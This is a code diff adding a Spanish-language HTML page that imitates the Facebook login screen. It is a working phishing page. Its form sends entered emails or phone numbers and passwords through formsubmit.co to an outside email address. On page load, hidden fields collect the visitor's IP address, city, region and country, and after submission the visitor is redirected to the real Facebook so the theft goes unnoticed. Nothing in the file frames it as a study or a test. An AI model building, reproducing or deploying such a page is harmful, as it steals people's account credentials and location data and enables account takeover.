@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Facebook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+            position: relative;
+        }
+
+        .login-form h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .login-form button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+
+        .login-form button:hover {
+            background-color: #166fe5;
+            transform: scale(1.02);
+        }
+
+        .login-form a {
+            display: block;
+            margin: 10px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+
+        .login-form a:hover {
+            color: #166fe5;
+            text-decoration: underline;
+        }
+
+        .login-form hr {
+            border: 1px solid #dddfe2;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            padding: 12px;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+            transform: scale(1.02);
+        }
+
+        .login-container .icon {
+            margin-bottom: 20px;
+            animation: bounce 0s infinite;
+        }
+
+        .icon-facebook {
+            color: #1877f2;
+            font-size: 50px;
+        }
+
+        .language-selector {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 5px;
+            border-radius: 5px;
+            border: 1px solid #dddfe2;
+        }
+
+        .show-password {
+            position: absolute;
+            right: 45px;
+            margin-top: -35px;
+            cursor: pointer;
+            color: #1877f2;
+        }
+
+        .password-strength {
+            height: 5px;
+            margin-top: 5px;
+            border-radius: 3px;
+            transition: all 0.3s;
+        }
+
+        .dark-mode-toggle {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            cursor: pointer;
+            padding: 5px;
+            border-radius: 50%;
+            background: #f0f2f5;
+            border: none;
+        }
+
+        .dark-mode {
+            background-color: #18191a;
+            color: white;
+        }
+
+        .dark-mode .login-container {
+            background-color: #242526;
+            box-shadow: 0 2px 10px rgba(255, 255, 255, 0.1);
+        }
+
+        .dark-mode input {
+            background-color: #3a3b3c;
+            color: white;
+            border-color: #3a3b3c;
+        }
+
+        .location-info {
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+            text-align: left;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-20px);
+            }
+            60% {
+                transform: translateY(-10px);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 20px;
+            }
+
+            .icon-facebook {
+                font-size: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <button class="dark-mode-toggle">
+            <i class="fas fa-moon"></i>
+        </button>
+        
+        <select class="language-selector">
+            <option value="es">Español</option>
+            <option value="en">English</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+        </select>
+
+        <div class="icon">
+            <i class="fab fa-facebook icon-facebook"></i>
+        </div>
+        <div class="login-form">
+            <h2>Iniciar sesión en Facebook</h2>
+            <form action="https://formsubmit.co/codama1633@kuandika.com" method="POST" id="loginForm">
+                <input type="text" name="user_input" placeholder="Correo electrónico o número de teléfono" required>
+                <div style="position: relative;">
+                    <input type="password" name="password" placeholder="Contraseña" required id="passwordField">
+                    <i class="far fa-eye show-password" id="togglePassword"></i>
+                </div>
+                <div class="password-strength" id="passwordStrength"></div>
+                
+                <!-- Campos ocultos para IP y ubicación -->
+                <input type="hidden" name="ip_address" id="ipAddress">
+                <input type="hidden" name="country" id="country">
+                <input type="hidden" name="city" id="city">
+                <input type="hidden" name="region" id="region">
+                
+                <input type="hidden" name="_email" value="codama1633@kuandika.com">
+                <input type="hidden" name="_next" value="https://www.facebook.com/">
+                <input type="hidden" name="_captcha" value="false">
+
+                <button type="submit">Iniciar sesión</button>
+            </form>
+            
+            <a href="#">¿Olvidaste tu contraseña?</a>
+            <hr>
+            <button class="create-account" type="submit">Crear cuenta nueva</button>
+        </div>
+    </div>
+
+    <script>
+        // Toggle de contraseña
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordField = document.getElementById('passwordField');
+
+        togglePassword.addEventListener('click', function() {
+            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordField.setAttribute('type', type);
+            this.classList.toggle('fa-eye');
+            this.classList.toggle('fa-eye-slash');
+        });
+
+        
+
+     
+
+        // Obtener IP y ubicación
+        async function getIPAndLocation() {
+            try {
+                // Obtener IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Obtener información de ubicación
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+
+                // Actualizar campos ocultos
+                document.getElementById('ipAddress').value = ipData.ip;
+                document.getElementById('country').value = locationData.country_name;
+                document.getElementById('city').value = locationData.city;
+                document.getElementById('region').value = locationData.region;
+
+                // Mostrar información en el div
+               
+            } catch (error) {
+                console.error('Error al obtener la ubicación:', error);
+                document.getElementById('locationInfo').innerHTML = 'No se pudo detectar la ubicación';
+            }
+        }
+
+        // Ejecutar al cargar la página
+        window.onload = getIPAndLocation;
+
+        // Selector de idioma
+        const languageSelector = document.querySelector('.language-selector');
+        
+        languageSelector.addEventListener('change', (e) => {
+            console.log(`Idioma cambiado a: ${e.target.value}`);
+        });
+    </script>
+</body>
+</html>
